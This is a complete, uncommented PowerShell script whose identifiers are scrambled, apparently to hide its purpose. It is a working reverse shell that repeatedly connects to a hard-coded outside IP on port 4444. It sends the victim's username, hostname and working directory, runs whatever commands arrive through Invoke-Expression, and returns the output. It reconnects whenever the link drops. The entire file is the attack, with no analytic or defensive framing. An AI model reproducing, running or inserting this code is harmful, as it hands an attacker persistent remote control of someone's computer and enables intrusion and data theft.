class qltsgr {
    
    [string]$AJIFJqFLCmsbdIRN = "3.26.71.186"
    [int]$ulyxjBjfxoAhSUfetngxHI = 4444

    $dhLfVOLJuqgjbrdZDfELUZ
    $uNBDFajplXgWEMuey
    $iwsvOtbGJw
    $fJXuEyMUphVvBb
    $xDBZJTvj
    $xqvuCB
    [int]$YwKBAPycSmZibqN = 50*1024

    RSPbWWOnOelD() {
        $this.uNBDFajplXgWEMuey = $false
        while ($true) {
            try {
                $this.uNBDFajplXgWEMuey = New-Object Net.Sockets.TcpClient($this.AJIFJqFLCmsbdIRN, $this.ulyxjBjfxoAhSUfetngxHI)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.zMozl()
    }

    zMozl() {
        $this.dhLfVOLJuqgjbrdZDfELUZ = $this.uNBDFajplXgWEMuey.GetStream()
        $this.fJXuEyMUphVvBb = New-Object Byte[] $this.YwKBAPycSmZibqN
        $this.xqvuCB = New-Object Text.UTF8Encoding
        $this.iwsvOtbGJw = New-Object IO.StreamWriter($this.dhLfVOLJuqgjbrdZDfELUZ, [Text.Encoding]::UTF8, $this.YwKBAPycSmZibqN)
        $this.xDBZJTvj = New-Object System.IO.StreamReader($this.dhLfVOLJuqgjbrdZDfELUZ)
        $this.iwsvOtbGJw.AutoFlush = $true
    }

    MQTliCYAvRhQRXJUBU() {
        $this.RSPbWWOnOelD()
        $this.yBSaiDgMsrKKeixqkh()
    }

    kgCSgaTbFWTIqVegAc($vClXyJES) {
        try {
            [byte[]]$AjDXN = [text.Encoding]::Ascii.GetBytes($vClXyJES)
            $this.iwsvOtbGJw.Write($AjDXN, 0, $AjDXN.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.MQTliCYAvRhQRXJUBU()
        }
    }

    [string] ZPpEvzUqkRUNZESs() {
        try {
            $ajHOusqKcHONlv = $this.dhLfVOLJuqgjbrdZDfELUZ.Read($this.fJXuEyMUphVvBb, 0, $this.YwKBAPycSmZibqN)    
            $oCdEJGQfnNMzXqzBIyCturT = ($this.xqvuCB.GetString($this.fJXuEyMUphVvBb, 0, $ajHOusqKcHONlv))
            return $oCdEJGQfnNMzXqzBIyCturT
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.MQTliCYAvRhQRXJUBU()
            return ""
        }
    }

    [string] oAWROEwPYbIJygENcMIWD($VIFPLfqCCwHrHmtBM) {
        Write-Host $VIFPLfqCCwHrHmtBM
        try { 
            $RmHlASwFJYWTyFmXjbfvnc = Invoke-Expression $VIFPLfqCCwHrHmtBM | Out-String
        }
        catch {
            $hSjqOcLtPOehjFjdYiFjPE = $_.Exception
            $eYCSyjGw = $_.Message
            $RmHlASwFJYWTyFmXjbfvnc = "`n$_`n"
        }
        return $RmHlASwFJYWTyFmXjbfvnc
    }

    [string] QIqgaJwxzyZOZBMmROrGtX() {
        $REzEPMnLhdDDCXNeLzRDLt = [Environment]::UserName
        $RHLCsGIkWWjisRkMyT = [System.Net.Dns]::GetHostName()
        $FFKScRelARXDtWDF = Get-Location
        return "$REzEPMnLhdDDCXNeLzRDLt@$RHLCsGIkWWjisRkMyT [$FFKScRelARXDtWDF]~$ "
    }

    yBSaiDgMsrKKeixqkh() {
        while ($this.uNBDFajplXgWEMuey.Connected) {
            $this.kgCSgaTbFWTIqVegAc($this.QIqgaJwxzyZOZBMmROrGtX())         
            $oCdEJGQfnNMzXqzBIyCturT = $this.ZPpEvzUqkRUNZESs()
            $RmHlASwFJYWTyFmXjbfvnc = "`n"
            if ([string]::IsNullOrEmpty($oCdEJGQfnNMzXqzBIyCturT)) {
                continue
            }
            $RmHlASwFJYWTyFmXjbfvnc = $this.oAWROEwPYbIJygENcMIWD($oCdEJGQfnNMzXqzBIyCturT)
            $this.kgCSgaTbFWTIqVegAc($RmHlASwFJYWTyFmXjbfvnc + "`n")
            $this.dhLfVOLJuqgjbrdZDfELUZ.Flush()
        }
        $this.uNBDFajplXgWEMuey.Close()
        $this.MQTliCYAvRhQRXJUBU()
    } 
}

$eOaaQAMUjoJMMxDSzeynQ = [qltsgr]::new()
$eOaaQAMUjoJMMxDSzeynQ.MQTliCYAvRhQRXJUBU()
